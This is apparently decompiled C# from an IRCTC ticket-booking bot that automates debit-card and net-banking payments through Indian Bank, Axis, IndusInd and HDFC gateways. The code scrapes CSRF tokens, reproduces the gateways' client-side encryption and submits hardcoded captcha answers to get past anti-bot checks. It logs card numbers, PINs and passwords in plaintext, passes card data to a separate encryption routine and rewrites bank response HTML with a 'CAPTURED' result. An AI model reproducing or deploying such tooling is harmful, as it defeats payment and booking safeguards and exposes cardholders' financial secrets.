                        string text10 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("name=\"paymentId\"", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text11 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchWeb", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchTrackId", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text12 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchErrUrl", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        clsMain.Lock("paymentIdKey: " + text8);
                        clsMain.Lock("Get Encrypted Data, inp = " + text8 + "||" + text7 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4);
                        text = Class12.smethod_17(text, text8);
                        text2 = Class12.smethod_17(text2, text8);
                        text5 = Class12.smethod_17(text5, text8);
                        string text13 = Class12.smethod_17(text3, text8);
                        string text14 = Class12.smethod_17(text4, text8);
                        clsMain.Lock("Loading Captcha");
                        if (updateTStatus_1 != null && !clsMain.control_0.IsDisposed)
                        {
                            updateTStatus_1.BeginInvoke(1, "Provide Captcha for Indian Debit.", tCntrlName_, null, null);
                        }
                        string text15 = "5G7QM";
                        string text16 = DateTime.Now.ToString("ddd MMM dd HH:mm:ss IST yyyy");
                        string string_95 = text8 + text9 + text + text2 + "A" + text5 + text15 + "0" + text16 + text11 + "file:////fss50/PGWAYC/config/instupd/11/MERCHANT/3302/CSS/style.css/fss50/PGWAYC/config/instupd/11/MERCHANT/3302/Header/IBK1.jpg//fss50//PGWAYC//config////brands//default//label.propertiesIB IRCTChttps://www.irctc.co.in" + text12 + "01010" + 0 + "INDIAN BANKhttps://www.irctc.co.in/eticketing/BankResponse0033000311330200" + text13 + "D" + text14 + "/fss50/PGWAYC/config/instupd/11/MERCHANT/3302/HTML/footer.html";
                        string string_96 = Class12.smethod_22(text10).ToString().ToUpper();
                        string text17 = Class12.smethod_20(Class12.smethod_22(Class12.smethod_20(string_95, string_96).ToString().ToUpper()).ToString().ToUpper(), string_96).ToString().ToUpper();
                        text17 += "^JTVFcGF5bWVudElkS2V5JTVFaGRuZGl2VHlwZSU1RWVuY0NhcHRjaGElNUVkZWJpdENhcmROdW1iZXIlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFY2FyZFBpblR5cGUlNUVjYXJkUGluJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RXBheW1lbnRJZCU1RXN0eWxlQ3NzJTVFaGVhZGVyRmlsZSU1RWxhYmVsRmlsZSU1RW1yY2hOYW1lJTVFbXJjaFdlYiU1RW1yY2hUcmFja0lkJTVFcHltbnRJbnN0cm1udENDJTVFcHltbnRJbnN0cm1udERDJTVFcHltbnRJbnN0cm1udEFQJTVFcHltbnRJbnN0cm1udEREJTVFZWNvbUZsZyU1RWNhcHRjaGFGbGclNUVpbnN0TmFtZSU1RW1yY2hFcnJVcmwlNUVhdnNGbGclNUVoZWFkZXJUeXBlJTVFdGVybUlkJTVFaW5zdElkJTVFbXJjaElkJTVFbWFlc3Ryb0NoZWNrRmxhZyU1RXB5bW50SW5zdHJtbnRJTVBTJTVFZ3JpcHNGbGFnJTVFY3JlZGl0TW9udGglNUVjcmVkaXRZZWFyJTVFZGViaXRNb250aCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdFllYXIlNUVyZGMlNUVydXBheVRyYW5UeXBlJTVFc2VsZWN0ZWRWYWx1ZSU1RWNoZWNrRGViaXQlNUVmb290ZXI%3D";
                        text6 = "paymentIdKey=" + text8 + "&hdndivType=&encCaptcha=" + text9.Replace("=", "%3D") + "&cspg=" + text17.Replace("^", "%5E") + "&CSRFToken=" + text10 + "&debitCardNumber=" + text + "&debitCardholderName=" + text2 + "&cardPinType=A&cardPin=" + text5 + "&cardCvd2pin=&passline=" + text15 + "&gstnTXNId=&gstnFlag=0&paymentInitTime=" + HttpUtility.UrlEncode(text16) + "&paymentId=" + text11 + "&styleCss=file%3A%2F%2F%2F%2Ffss50%2FPGWAYC%2Fconfig%2Finstupd%2F11%2FMERCHANT%2F3302%2FCSS%2Fstyle.css&headerFile=%2Ffss50%2FPGWAYC%2Fconfig%2Finstupd%2F11%2FMERCHANT%2F3302%2FHeader%2FIBK1.jpg&labelFile=%2F%2Ffss50%2F%2FPGWAYC%2F%2Fconfig%2F%2F%2F%2Fbrands%2F%2Fdefault%2F%2Flabel.properties&mrchName=IB+IRCTC&mrchWeb=https%3A%2F%2Fwww.irctc.co.in&mrchTrackId=" + text12 + "&pymntInstrmntCC=0&pymntInstrmntDC=1&pymntInstrmntAP=0&pymntInstrmntDD=1&ecomFlg=0&captchaFlg=0&instName=INDIAN+BANK&mrchErrUrl=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&avsFlg=0&headerType=0&termId=330003&instId=11&mrchId=3302&maestroCheckFlag=0&pymntInstrmntIMPS=0&gripsFlag=&creditMonth=&creditYear=&debitMonth=" + text13 + "&creditDebitCheck=D&debitYear=" + text14 + "&rdc=&rupayTranType=&selectedValue=&checkDebit=&footer=%2Ffss50%2FPGWAYC%2Fconfig%2Finstupd%2F11%2FMERCHANT%2F3302%2FHTML%2Ffooter.html";
                        string_91 = "https://securepayments.fssnet.co.in/pgwayc/paymentpage.htm";
                        string_92 = "https://securepayments.fssnet.co.in/pgwayc/paymentrouter.htm";
                        clsMain.Lock("Second Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Second Hit output = " + string_94);
                        if (!string_94.Contains("Please wait your Transaction is getting processed"))
                        {
                            string_90 = "Failed while providing Debit Card Details.";
                            clsMain.Lock("Second Hit Failed. Check HTML");
                            return false;
                        }
                        startIndex = string_94.IndexOf("result=") + 7;
                        length = string_94.IndexOf("&", startIndex) - startIndex;
                        int num = (string_94.Substring(startIndex, length).ToUpper().Contains("NOT") ? 1 : 0);
                        if (num != 0)
                        {
                            clsMain.Lock("Payment Failed");
                            string_90 = "Invalid Card Details, Payment Failed!";
                            return false;
                        }
                        clsMain.Lock("Success ProcessIndianDebit isPaymentFailed = " + num);
                        string_89 = string_94;
                        string_90 = string_92;
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessIndianDebit", ex.Message);
                }
                finally
                {
                    bool_27 = false;
                }
                return false;
            }
            string_90 = "Some thing went wrong with Indian Payment";
            clsMain.Lock("Html doesn't contains fssnet.co.in, returning.");
            return false;
        }

        internal bool method_119(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessAxisDebit.");
            if (string_86.Contains("fssnet.co.in"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[6];
                string text3 = array[1];
                string text4 = array[2];
                string text5 = array[3];
                string string_92 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                try
                {
                    bool_27 = true;
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "Axis Debit Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("Card Holders Name"))
                    {
                        string text7 = "";
                        string text8 = "";
                        string text9 = "";
                        string text10 = "ECB";
                        string text11 = "";
                        string text12 = "";
                        string text13 = "";
                        string text14 = "";
                        string text15 = "";
                        string text16 = "";
                        while (true)
                        {
                            int startIndex = string_94.IndexOf("function encrypData");
                            startIndex = string_94.IndexOf("var paymentId", startIndex);
                            startIndex = string_94.IndexOf("\"", startIndex) + 1;
                            int length = string_94.IndexOf("\"", startIndex) - startIndex;
                            text12 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("var encCaptcha");
                            startIndex = string_94.IndexOf("\"", startIndex) + 1;
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            text7 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("CSRFToken\"", startIndex);
                            startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            text9 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("name=\"paymentId\"");
                            startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                            length = string_94.IndexOf("'", startIndex) - startIndex;
                            text11 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("mrchWeb", startIndex);
                            startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                            length = string_94.IndexOf("'", startIndex) - startIndex;
                            string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("mrchTrackId", startIndex);
                            startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                            length = string_94.IndexOf("'", startIndex) - startIndex;
                            text14 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("mrchErrUrl", startIndex);
                            startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                            length = string_94.IndexOf("'", startIndex) - startIndex;
                            string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("paymentIdKey\" value");
                            startIndex = string_94.IndexOf("value=\"", startIndex);
                            startIndex = string_94.IndexOf("\"", startIndex) + 1;
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            text15 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("paymentInitTime\" value");
                            startIndex = string_94.IndexOf("value=", startIndex);
                            startIndex = string_94.IndexOf("'", startIndex) + 1;
                            length = string_94.IndexOf("'", startIndex) - startIndex;
                            text16 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            text8 = "AE8D5";
                            int num = 0;
                            clsMain.Lock("paymentIdKey: " + text12);
                            if (updateTStatus_2 != null)
                            {
                                clsMain.Lock("Get Encrypted Data, inp = " + text12 + "||" + text10 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4);
                                updateTStatus_2(1001, text12 + "||" + text10 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4, "");
                            }
                            if (clsMain.dictionary_5.ContainsKey(text12))
                            {
                                object obj = new object();
                                object obj2 = obj;
                                lock (obj2)
                                {
                                    text13 = clsMain.dictionary_5[text12];
                                    clsMain.Lock("Encrypted Data, out = " + text13);
                                    clsMain.dictionary_5.Remove(text12);
                                }
                            }
                            if (text13.Length < 70)
                            {
                                text13 = method_77("HDFCDEBIT~~" + text12 + "||" + text10 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4);
                                clsMain.Lock("EncServerHit out: " + text13);
                            }
                            if (text13.Length >= 96)
                            {
                                string[] array2 = text13.Split(new string[1] { "||" }, StringSplitOptions.None);
                                text = array2[0];
                                text2 = array2[1];
                                text5 = array2[2];
                                string text17 = array2[3];
                                string text18 = array2[4];
                                string string_95 = text15 + text7 + text + text2 + "A" + text5 + text8 + "0" + text16 + text11 + "file:////fss50/axisbank/Config/ipay/instupd/30/INSTITUTION/CSS/paypage-theme.css/fss50/axisbank/Config/ipay/instupd/30/INSTITUTION/Header/axis-irctc.jpg//fss50//axisbank//Config//ipay//brands//default//label.propertiesIRCTC APINhttps://www.irctc.co.in" + text14 + "01000" + num + "AXIS BANKhttps://www.irctc.co.in/eticketing/BankResponse0030000230300200" + text17 + "D" + text18 + "//fss50//axisbank//Config//ipay//brands//default///footer.html";
                                string string_96 = Class12.smethod_22(text9).ToString().ToUpper();
                                string text19 = Class12.smethod_20(Class12.smethod_22(Class12.smethod_20(string_95, string_96).ToString().ToUpper()).ToString().ToUpper(), string_96).ToString().ToUpper();
                                text19 += "^JTVFcGF5bWVudElkS2V5JTVFaGRuZGl2VHlwZSU1RWVuY0NhcHRjaGElNUVkZWJpdENhcmROdW1iZXIlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFY2FyZFBpblR5cGUlNUVjYXJkUGluJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RXBheW1lbnRJZCU1RXN0eWxlQ3NzJTVFaGVhZGVyRmlsZSU1RWxhYmVsRmlsZSU1RW1yY2hOYW1lJTVFbXJjaFdlYiU1RW1yY2hUcmFja0lkJTVFcHltbnRJbnN0cm1udENDJTVFcHltbnRJbnN0cm1udERDJTVFcHltbnRJbnN0cm1udEFQJTVFcHltbnRJbnN0cm1udEREJTVFZWNvbUZsZyU1RWNhcHRjaGFGbGclNUVpbnN0TmFtZSU1RW1yY2hFcnJVcmwlNUVhdnNGbGclNUVoZWFkZXJUeXBlJTVFdGVybUlkJTVFaW5zdElkJTVFbXJjaElkJTVFbWFlc3Ryb0NoZWNrRmxhZyU1RXB5bW50SW5zdHJtbnRJTVBTJTVFZ3JpcHNGbGFnJTVFY3JlZGl0TW9udGglNUVjcmVkaXRZZWFyJTVFZGViaXRNb250aCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdFllYXIlNUVyZGMlNUVydXBheVRyYW5UeXBlJTVFc2VsZWN0ZWRWYWx1ZSU1RWNoZWNrRGViaXQlNUVmb290ZXI=";
                                text6 = "paymentIdKey=" + text15 + "&hdndivType=&encCaptcha=" + text7.Replace("=", "%3D") + "&cspg=" + text19.Replace("^", "%5E") + "&CSRFToken=" + text9 + "&debitCardNumber=" + text + "&debitCardholderName=" + text2 + "&cardPinType=A&cardPin=" + text5 + "&cardCvd2pin=&passline=" + text8 + "&paymentId=" + text11 + "&gstnTXNId=&gstnFlag=0&styleCss=file%3A%2F%2F%2F%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F30%2FINSTITUTION%2FCSS%2Fpaypage-theme.css&headerFile=%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F30%2FINSTITUTION%2FHeader%2Faxis-irctc.jpg&labelFile=%2F%2Ffss50%2F%2Faxisbank%2F%2FConfig%2F%2Fipay%2F%2Fbrands%2F%2Fdefault%2F%2Flabel.properties&mrchName=IRCTC+APIN&mrchWeb=https%3A%2F%2Fwww.irctc.co.in&mrchTrackId=" + text14 + "&pymntInstrmntCC=0&pymntInstrmntDC=1&pymntInstrmntAP=0&pymntInstrmntDD=0&ecomFlg=0&captchaFlg=" + num + "&instName=AXIS+BANK&mrchErrUrl=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&avsFlg=0&headerType=0&termId=300002&instId=30&mrchId=3002&maestroCheckFlag=0&pymntInstrmntIMPS=0&gripsFlag=&creditMonth=&creditYear=&debitMonth=" + text17 + "&creditDebitCheck=D&debitYear=" + text18 + "&paymentInitTime=" + HttpUtility.UrlEncode(text16) + "&rdc=&rupayTranType=&selectedValue=&checkDebit=&footer=%2F%2Ffss50%2F%2Faxisbank%2F%2FConfig%2F%2Fipay%2F%2Fbrands%2F%2Fdefault%2F%2F%2Ffooter.html";
                                string_91 = "https://securepayments.fssnet.co.in/ipay/paymentpage.htm";
                                string_92 = "https://securepayments.fssnet.co.in/ipay/paymentrouter.htm";
                                clsMain.Lock("Second Hit Inp = " + text6);
                                if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                                {
                                    break;
                                }
                                clsMain.Lock("Second Hit output = " + string_94);
                                if (!string_94.Contains("Please wait your Transaction is getting processed"))
                                {
                                    if (string_94.Contains("id=\"debitCaptchaMsg"))
                                    {
                                        startIndex = string_94.IndexOf("id=\"debitCaptchaMsg");
                                        startIndex = string_94.IndexOf(">", startIndex) + 1;
                                        length = string_94.IndexOf("<", startIndex) - startIndex;
                                        if (string_94.Substring(startIndex, length).IndexOf("Invalid captcha", StringComparison.CurrentCultureIgnoreCase) >= 0)
                                        {
                                            continue;
                                        }
                                    }
                                    string_90 = "Failed while providing Debit Card Details.";
                                    clsMain.Lock("Second Hit Failed. Check HTML");
                                    return false;
                                }
                                startIndex = string_94.IndexOf("result=") + 7;
                                length = string_94.IndexOf("&", startIndex) - startIndex;
                                string text20 = string_94.Substring(startIndex, length).ToUpper();
                                if (text20 != "CAPTURED")
                                {
                                    clsMain.Lock("Payment Failed");
                                    string_90 = text20.Replace("+", " ");
                                    return false;
                                }
                                NameValueCollection nameValueCollection = HttpUtility.ParseQueryString(HttpUtility.UrlDecode(method_140("responseData", string_94)).Replace("&amp;", "&"));
                                string value = "<input type='hidden' name='trackid' value='" + nameValueCollection["trackid"] + "'/> <input type='hidden' name='tranid' value='" + nameValueCollection["tranid"] + "'/> <input type='hidden' name='ref' value='" + nameValueCollection["ref"] + "'/> <input type='hidden' name='amt' value='" + nameValueCollection["amt"] + "' /> <input type='hidden' name='result' value='CAPTURED'/></form></body></html>";
                                startIndex = string_94.IndexOf("name=\"trackid\"");
                                startIndex = string_94.LastIndexOf("<", startIndex);
                                length = string_94.IndexOf("result\"", startIndex);
                                length = string_94.IndexOf(">", length) + 1;
                                string_94 = string_94.Remove(startIndex);
                                string_94 = string_94.Insert(startIndex, value);
                                Thread.Sleep(500);
                                clsMain.Lock("Success ProcessAxisDebit");
                                string_89 = string_94;
                                string_90 = string_92;
                                return true;
                            }
                            string_90 = "Some thing went wrong with Axis Debit Payment";
                            clsMain.Lock("Encrypted values are not proper.");
                            return false;
                        }
                        clsMain.Lock("Second Hit Failed. err = " + string_93);
                        string_90 = "Failed while making Payment.";
                        return false;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessAxisDebit", ex.Message);
                    result = false;
                }
                finally
                {
                    bool_27 = false;
                }
                return result;
            }
            string_90 = "Some thing went wrong with Axis Payment";
            string string_97 = "Html doesn't contains fssnet.co.in, returning.";
            clsMain.Lock(string_97);
            return false;
        }

        private bool method_120(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            string_90 = "";
            string_89 = "";
            clsMain.Lock("Enter ProcessInduNetBanking.");
            if (string_86.Contains("indusind"))
            {
                string string_91 = class3_0.string_69;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string string_92 = array[1];
                string string_93 = array[2];
                string string_94 = "";
                string text2;
                if (bool_13)
                {
                    bool_13 = false;
                    string[] array2 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                    text2 = array2[0];
                    string_94 = array2[1];
                }
                else
                {
                    text2 = class3_0.Method_SerialInp(string_86, ref string_94, false);
                }
                CookieContainer cookieContainer_ = null;
                string text3 = "https://indusnet.indusind.com/corp/";
                string string_95 = "";
                string string_96 = "";
                try
                {
                    clsMain.Lock("First Hit : Inp = " + text2);
                    if (!_Request(string_94, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_95);
                        string_90 = "Indusind Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_96);
                    if (!string.IsNullOrEmpty(string_96.Trim()) && string_96.Contains("Welcome to IndusNet"))
                    {
                        int startIndex = string_96.IndexOf("ACTION=");
                        startIndex = string_96.IndexOf("\"", startIndex) + 1;
                        int length = string_96.IndexOf("\"", startIndex) - startIndex;
                        string text4 = string_96.Substring(startIndex, length).Trim();
                        startIndex = string_96.IndexOf("var randomkey");
                        startIndex = string_96.IndexOf("'", startIndex) + 1;
                        length = string_96.IndexOf("'", startIndex) - startIndex;
                        string str = Class12.smethod_33(string_96.Substring(startIndex, length) + string_50, string_92);
                        string_91 = string_94;
                        string_94 = text3 + text4;
                        text2 = "CorporateSignonCorpId=" + text + "&CorporateSignonPassword=" + HttpUtility.UrlEncode(str).Replace("%3d", "%3D") + "&isEncrypted=Y&Action.ShoppingMall.Signon=Y";
                        clsMain.Lock("Second Hit : Inp = " + text2);
                        if (!_Request(string_94, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_95);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Second Hit Output = " + string_96);
                        if (string_96.Contains("Please enter valid Answer for Question"))
                        {
                            string text5 = string_96;
                            string text6 = text5.Substring(text5.IndexOf("Question : ") + 11);
                            string text7 = text6.Substring(0, text6.IndexOf("\r"));
                            text6 = text5.Substring(text5.IndexOf("value == \"A") + 11);
                            text6 = text6.Substring(text6.IndexOf("BANKAWAYTRAN"));
                            string string_97 = "https://indusnet.indusind.com/corp/" + text6.Substring(0, text6.IndexOf("\""));
                            string text8 = Interaction.InputBox("Enter Debit Card Grid Value For Following Digit: " + "mmm");//(text7.Contains("In what city is your vacation") ? "dganj" : ((!text7.ToUpper().Contains("FRIEND")) ? "cat" : "javed"));
                            text2 = "answer1=" + text8 + "&CAPSSTATUS=&CAPSVALUE=&userAction=A";
                            clsMain.Lock("Third Hit : Inp = " + text2);
                            if (!_Request(string_97, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_95);
                                string_90 = "Failed while making Payment. Payment Not Done";
                                return false;
                            }
                            clsMain.Lock("Third Hit : Output = " + string_96);
                        }
                        if (!string_96.Contains("Payment Details"))
                        {
                            string_90 = "Failed while Login into Indusind Bank";
                            if (string_96.IndexOf("User ID or Login Password entered by you is incorrect", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                string_90 = "Invalid User ID or Login Password";
                            }
                            clsMain.Lock("Second Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        startIndex = string_96.IndexOf("UserAccountsIndex");
                        startIndex = string_96.IndexOf("<option", startIndex) + 1;
                        startIndex = string_96.IndexOf("\"", startIndex) + 1;
                        length = string_96.IndexOf("\"", startIndex) - startIndex;
                        string s = string_96.Substring(startIndex, length).Trim();
                        s = ((!int.TryParse(s, out var result)) ? "1" : ((result > 5) ? "1" : result.ToString()));
                        int num2 = 0;
                        while (true)
                        {
                            num2++;
                            startIndex = string_96.IndexOf("ACTION=");
                            startIndex = string_96.IndexOf("\"", startIndex) + 1;
                            length = string_96.IndexOf("\"", startIndex) - startIndex;
                            text4 = string_96.Substring(startIndex, length).Trim();
                            string_91 = string_94;
                            string_94 = text3 + text4;
                            string text9 = clsPostData.smethod_7("", string_96, "input", "MaskNo");
                            text2 = "MaskNo=" + text9 + "&UserAccountsIndex=" + s + "&DebitTxnMemo=&Action.Bills.ShoppingMall.MakePayment.Pay=Submit&Action.Bills.ShoppingMall.MakePayment.Pay.x=&Action.Bills.ShoppingMall.MakePayment.Pay.y=";
                            clsMain.Lock("Third Hit : Inp = " + text2);
                            if (_Request(string_94, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                            {
                                clsMain.Lock("Third Hit : Output = " + string_96);
                                if (!string_96.Contains("The transaction could not be completed due to insufficient funds"))
                                {
                                    break;
                                }
                                if (num2 < 2)
                                {
                                    s = num2.ToString();
                                    continue;
                                }
                                string_90 = "The transaction could not be completed due to insufficient funds";
                                clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                                return false;
                            }
                            clsMain.Lock("Third Hit Failed. err = " + string_95);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        if (!string_96.Contains("Payment Confirmation"))
                        {
                            string_90 = "Failed while making Payment. Payment Not Done";
                            clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        startIndex = string_96.IndexOf("ACTION=");
                        startIndex = string_96.IndexOf("\"", startIndex) + 1;
                        length = string_96.IndexOf("\"", startIndex) - startIndex;
                        text4 = string_96.Substring(startIndex, length).Trim();
                        string text10 = method_140("CorpID", string_96);
                        text10 = clsPostData.smethod_7("", string_96, "input", "ValCorpTxnPwdUserName");
                        if (text10.Length < 4)
                        {
                            text10 = text;
                        }
                        string_94 = text3 + text4;
                        clsMain.Lock("Third Hit : Output = " + string_96);
                        if (!string_96.Contains("var randomkey"))
                        {
                            string_90 = "Failed while making Payment. Payment Not Done";
                            clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        startIndex = string_96.IndexOf("ACTION=");
                        startIndex = string_96.IndexOf("\"", startIndex) + 1;
                        length = string_96.IndexOf("\"", startIndex) - startIndex;
                        text4 = string_96.Substring(startIndex, length).Trim();
                        startIndex = string_96.IndexOf("var randomkey");
                        startIndex = string_96.IndexOf("'", startIndex) + 1;
                        length = string_96.IndexOf("'", startIndex) - startIndex;
                        string str2 = Class12.smethod_33(string_96.Substring(startIndex, length) + string_50, string_93);
                        text2 = "ValCorpTxnPwdUserName=" + text10 + "&tranType=T&ValCorpTxnPwdTxnPwd=" + HttpUtility.UrlEncode(str2) + "&ValCorpTxnPasscode=&Action.bills.ShoppingMall.TxnLogin.Ok=Submit&isEncrypted=Y";
                        string_91 = string_94;
                        string_94 = text3 + text4;
                        clsMain.Lock("Fourth Hit : Inp = " + text2);
                        if (!_Request(string_94, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("Fourth Hit Failed. err = " + string_95);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Fourth Hit : Output = " + string_96);
                        if (!string_96.Contains("Transaction Successfully") || string_96.Contains("transaction could not be processed"))
                        {
                            string_90 = "Payment Failed by Indusind";
                            clsMain.Lock("Fourth Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        string_90 = string_94;
                        int startIndex2 = string_96.IndexOf("id=\"PAID", StringComparison.CurrentCultureIgnoreCase);
                        startIndex2 = string_96.IndexOf("https://", startIndex2);
                        int length2 = string_96.IndexOf("\"", startIndex2) - startIndex2;
                        string_89 = string_96.Substring(startIndex2, length2).Trim();
                        num = 1;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessInduNetBanking", ex.Message);
                    num = 0;
                }
                return num != 0;
            }
            string_90 = "Some thing went wrong with InduSind Payment";
            clsMain.Lock("Html doesn't contains indusind, returning.");
            return false;
        }

        private bool method_121(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            string_90 = "";
            string_89 = "";
            clsMain.Lock("Enter ProcessInduNetBanking.");
            if (string_86.Contains("secure.payu.in"))
            {
                string string_91 = class3_0.string_69;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                array[0].Trim();
                string string_92 = "";
                string text = array[7];
                string text2 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = new CookieContainer();
                string string_93 = "";
                string string_94 = "";
                try
                {
                    updateTStatus_2?.BeginInvoke(2, "HDFC Process 1/3.", tCntrlName_, null, null);
                    Cookie cookie = new Cookie("enTrace", "81606134528219156805110359691")
                    {
                        Domain = "netsafe.hdfcbank.com"
                    };
                    cookieContainer_.Add(cookie);
                    if (string_92.Contains("secure.payu.in"))
                    {
                        clsMain.Lock("First Hit : Inp = " + text2);
                        if (!_Request(string_92, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_93);
                            string_90 = "Indusind Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("First Output htm = " + string_94);
                        text2 = class3_0.Method_SerialInp(string_94, ref string_92, false);
                    }
                    clsMain.Lock("First Hit : Inp = " + text2);
                    updateTStatus_2?.BeginInvoke(2, "HDFC Process 2/3..", tCntrlName_, null, null);
                    if (!_Request(string_92, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "Indusind Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (string_94.Contains("I want to use"))
                    {
                        string_92 = "https://netsafe.hdfcbank.com/ACSWeb/com.enstage.entransact.servers.AccessControlServerSSL?perform=DEBIT_CARD_STATUS_STATIC";
